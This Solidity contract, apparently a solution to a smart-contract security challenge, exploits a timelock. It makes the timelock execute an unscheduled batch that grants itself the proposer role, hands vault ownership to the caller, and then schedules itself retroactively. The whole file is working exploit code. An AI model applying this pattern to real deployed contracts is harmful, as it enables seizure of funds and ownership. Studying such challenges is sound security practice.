// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./ClimberVault.sol";
import "./ClimberTimelock.sol";

contract ClimberAttacker {
    address payable private immutable timelock;
    address private immutable vault;

    uint256[] private values = [0, 0, 0];
    address[] private targets = new address[](3);
    bytes[] private dataElements = new bytes[](3);

    constructor(address payable _timelock, address _vault) {
        timelock = _timelock;
        vault = _vault;
    }

    function exploit() external {
        targets = [timelock, vault, address(this)];

        dataElements[0] = (
            abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this))
        );
        dataElements[1] = abi.encodeWithSignature("transferOwnership(address)", msg.sender);
        dataElements[2] = abi.encodeWithSignature("createSchedule()");

        ClimberTimelock(timelock).execute(targets, values, dataElements, bytes32("test"));
    }

    function createSchedule() external {
        ClimberTimelock(timelock).schedule(targets, values, dataElements, bytes32("test"));
    }
}